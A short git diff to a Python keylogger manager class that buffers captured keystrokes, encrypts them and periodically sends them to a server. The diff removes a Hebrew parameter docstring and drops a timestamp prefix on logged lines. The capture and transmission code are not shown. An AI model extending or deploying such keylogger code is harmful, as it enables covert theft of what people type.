@@ -10,13 +10,7 @@ from writeserver import WriteServer
 class KeyLoggerManager:
     def __init__(self, encryption: Encryption, writer: WriteServer, key: str,
                  collect_interval=5, flush_interval=30):
-        """
-        :param encryption: מופע של מחלקת הצפנה
-        :param writer: מופע של מחלקת שליחה לשרת
-        :param key: מפתח הצפנה
-        :param collect_interval: זמן (שניות) בין איסופים
-        :param flush_interval: זמן (שניות) בין שליחות לשרת
-        """
+
         self.key_logger_service = KeyLoggerService()
         self.encryption = encryption
         self.writer = writer
@@ -57,8 +51,7 @@ class KeyLoggerManager:
         print("KeyLoggerManager stopped!")
 
     def add_data(self, data: str):
-        timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-        line = f"{timestamp} - {data}"
+        line = data
         with self.lock:
             self.buffer.append(line)
 
